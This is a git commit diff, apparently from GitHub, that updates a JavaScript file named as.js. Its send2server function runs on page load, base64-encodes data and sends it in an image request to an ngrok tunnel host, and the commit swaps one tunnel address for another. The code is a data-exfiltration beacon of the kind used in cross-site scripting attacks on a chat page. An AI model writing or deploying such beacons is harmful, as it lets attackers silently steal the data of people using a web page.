b1a8db7fc8d0465f4d54bd4c3b1a3dd61326e9e6
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-21 08:52:39 +0530

    Update as.js

--- as.js
+++ as.js
@@ -1,7 +1,7 @@
 window.addEventListener('load', function () {
  function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://061d1356.ngrok.io?name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://6d288ef6.ngrok.io?name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
